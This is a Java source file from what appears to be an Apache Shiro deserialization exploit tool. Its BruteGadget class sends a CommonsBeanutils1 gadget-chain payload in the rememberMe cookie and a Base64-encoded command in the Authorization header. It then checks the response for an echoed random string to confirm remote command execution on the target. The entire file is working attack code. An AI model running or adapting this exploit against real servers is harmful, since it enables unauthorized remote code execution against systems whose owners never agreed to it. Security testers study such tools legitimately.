package com.y5neko.shiroexp.payloads;

import com.y5neko.shiroexp.misc.Tools;
import com.y5neko.shiroexp.request.HttpRequest;
import com.y5neko.shiroexp.request.ResponseOBJ;

import java.lang.reflect.Method;
import java.util.*;

public class BruteGadget {
    public static List<String> bruteGadget(TargetOBJ url) {
        // 定义gadget链
        List<String> gadgets = Collections.singletonList(
                "CommonsBeanutils1"
        );

        // 定义echo链
        List<String> echos = Collections.singletonList(
                "TomcatEcho"
        );

        // 储存验证成功的gadget
        List<String> success_gadgets = new ArrayList<>();

        // 遍历生成payload并验证
        for (String gadget : gadgets) {
            for (String echo : echos) {
                try {
                    Class<?> gadget_clazz = Class.forName("com.y5neko.shiroexp.gadget." + gadget);      // 反射获取利用链
                    Method method = gadget_clazz.getDeclaredMethod("genEchoPayload", String.class);
                    String payload = (String) method.invoke(null, echo);
                    // 生成验证命令
                    String checkString = Tools.generateRandomString(20);
                    String command = "echo " + checkString;

                    // 构造请求头
                    Map<String, String> headers = new HashMap<>();
                    headers.put("Cookie", url.getRememberMeFlag() + "=" + payload);
                    headers.put("Authorization", "Basic " + Base64.getEncoder().encodeToString(command.getBytes()));

                    // 校验响应中是否存在
                    ResponseOBJ responseOBJ = HttpRequest.httpRequest(url, null, headers, "GET");
                    String result = Tools.extractStrings(Tools.bytesToString(responseOBJ.getResponse()));
                    result = Tools.bytesToString(Base64.getDecoder().decode(result));

                    if (result.contains(checkString)) {
                        System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 发现回显链: " + gadget + " -> " + echo);
                        success_gadgets.add(gadget + "+" + echo);
                    }
                } catch (Exception e){
                    System.out.println("[" + Tools.color("EROR", "RED") + "] " + e.getMessage());
                }
            }
        }

        if (success_gadgets.isEmpty()) {
            System.out.println("[" + Tools.color("EROR", "RED") + "] 未发现有效回显链");
        } else {
            System.out.println("[" + Tools.color("SUCC", "GREEN") + "] 共发现" + success_gadgets.size() + "条有效回显链：");
            System.out.println("----------");
            for (String success_gadget : success_gadgets) {
                System.out.println(success_gadget);
            }
            System.out.println("----------");
        }

        return success_gadgets;
    }
}
